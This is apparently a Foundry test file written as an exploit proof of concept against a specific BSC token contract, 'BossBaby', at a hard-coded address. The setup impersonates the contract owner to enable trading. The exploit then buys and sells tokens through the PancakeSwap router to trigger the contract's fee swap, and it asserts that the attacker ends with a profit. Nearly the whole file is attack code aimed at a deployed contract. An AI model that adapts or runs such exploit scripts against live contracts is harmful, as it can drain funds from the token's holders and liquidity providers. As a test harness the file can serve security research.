    function enableTrading() external;
    function uniswapV2Pair() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function swapTokensAtAmount() external view returns (uint256);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xD8dBE5AC60cD1c0b40C9182cB3eB2392d3df371F;
    address attacker = address(this);
    IUniswapV2Router02 router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: get some initial BNB for attacker
        deal(attacker, 100 ether);

        // Impersonate owner to enable trading
        address owner = BossBaby(TARGET).owner();
        vm.startPrank(owner);
        BossBaby(TARGET).enableTrading();
        vm.stopPrank();

        // Get pair address
        address pair = BossBaby(TARGET).uniswapV2Pair();

        // Give attacker some initial tokens by buying from router
        vm.startPrank(attacker);
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = TARGET;

        // Buy some tokens
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 10 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial BNB balance
        uint256 initialBalance = attacker.balance;

        // Get router address (PancakeSwap on BSC)
        IUniswapV2Router02 pancakeRouter = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        // First, buy some tokens to generate fees
        vm.startPrank(attacker);
        address[] memory path = new address[](2);
        path[0] = pancakeRouter.WETH();
        path[1] = TARGET;

        // Buy tokens with 10 BNB
        pancakeRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 10 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );
        vm.stopPrank();

        // Check contract token balance
        uint256 contractTokenBalance = BossBaby(TARGET).balanceOf(TARGET);
        uint256 swapThreshold = BossBaby(TARGET).swapTokensAtAmount();

        // If contract doesn't have enough tokens to trigger swap, buy/sell more
        if (contractTokenBalance < swapThreshold) {
            // Get attacker's token balance
            uint256 attackerTokens = BossBaby(TARGET).balanceOf(attacker);

            // Sell half to generate more fees
            vm.startPrank(attacker);
            BossBaby(TARGET).approve(address(pancakeRouter), attackerTokens / 2);

            address[] memory sellPath = new address[](2);
            sellPath[0] = TARGET;
            sellPath[1] = pancakeRouter.WETH();

            pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                attackerTokens / 2,
                0,
                sellPath,
                attacker,
                block.timestamp
            );
            vm.stopPrank();
        }

        // Now sell remaining tokens to trigger fee processing
        uint256 finalTokenBalance = BossBaby(TARGET).balanceOf(attacker);

        vm.startPrank(attacker);
        BossBaby(TARGET).approve(address(pancakeRouter), finalTokenBalance);

        address[] memory finalPath = new address[](2);
        finalPath[0] = TARGET;
        finalPath[1] = pancakeRouter.WETH();

        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            finalTokenBalance,
            0,
            finalPath,
            attacker,
            block.timestamp
        );
        vm.stopPrank();

        // Check if attacker made profit
        uint256 finalBalance = attacker.balance;
        assertGt(finalBalance, initialBalance, "Attacker should have made profit");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

